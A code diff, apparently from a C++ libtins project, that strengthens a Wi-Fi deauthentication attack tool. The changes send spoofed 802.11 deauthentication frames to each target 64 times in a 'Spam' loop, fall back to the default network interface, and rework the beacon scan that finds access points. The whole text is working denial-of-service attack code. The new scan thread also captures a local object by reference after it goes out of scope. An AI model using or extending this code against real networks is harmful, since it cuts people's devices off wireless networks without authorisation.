@@ -23,14 +23,16 @@ Network::sendDeauth()
         for (auto target : targets) {
             if (!deauthing)
                 break;
-            std::cout << "Deauthing " << target.first.to_string() << " ("
-                      << target.second.to_string() << ")" << std::endl;
             deauthPacket = Dot11Deauthentication(target.second, spoofedBSSID);
+            deauthPacket.addr1(spoofedBSSID); // Set the BSSID
+            deauthPacket.addr2(target.second);
             deauthPacket.addr3(spoofedBSSID); // Set the BSSID
             deauthPacket.reason_code(0x0007); // From airplay-ng
             radio = RadioTap() / deauthPacket;
-            sender.send(radio, spoofingIfaceName);
-            std::this_thread::sleep_for(std::chrono::milliseconds(50));
+            for (int i = 0; i < 64; ++i) {  // Spam
+                sender.send(radio, spoofingIfaceName);
+                std::this_thread::sleep_for(std::chrono::milliseconds(10));
+            }
         }
     }
 }
@@ -41,9 +43,10 @@ Network::startDeauth()
     Tins::NetworkInterface spoofedIface(spoofingIfaceName);
     if (!spoofedIface.ipv4_address()) {
         std::cout << "[!] Interface " << spoofingIfaceName
-                  << " does not have an IPv4 address!" << std::endl
-                  << "[!] Exiting..." << std::endl;
-        exit(1);
+                  << " does not have an IPv4 address! Trying on the default iface..." << std::endl;
+                  //<< "[!] Exiting..." << std::endl;
+        //exit(1);
+        spoofingIfaceName = NetworkInterface::default_interface().name();
     }
     deauthing = true;
     deauthThread = std::thread(&Network::sendDeauth, this);
@@ -143,15 +146,17 @@ Network::getAccessPoints()
 {
     SnifferConfiguration config;
     config.set_promisc_mode(true);
-    config.set_filter("wlan type mgt subtype beacon");
+    config.set_filter("type mgt subtype beacon");
     config.set_rfmon(true);
     Sniffer sniffer(spoofingIfaceName, config);
 
-    scanning = true;
-    std::thread scanThread(&Network::stopScan, this);
-    scanThread.detach();
-
-    sniffer.sniff_loop(make_sniffer_handler(this, &Network::apScanCallback));
+    apScanning = true;
+    std::thread sniff_thread([&]() {
+            sniffer.sniff_loop(make_sniffer_handler(this, &Network::apScanCallback));
+    });
+    sniff_thread.detach();
+    std::this_thread::sleep_for(std::chrono::seconds(10));
+    apScanning = false;
     return accessPoints;
 }
 
@@ -193,14 +198,7 @@ Network::apScanCallback(PDU& pdu)
             }
         }
     }
-    return scanning;
-}
-
-void
-Network::stopScan()
-{
-    std::this_thread::sleep_for(std::chrono::seconds(5));
-    scanning = false;
+    return apScanning;
 }
 
 void
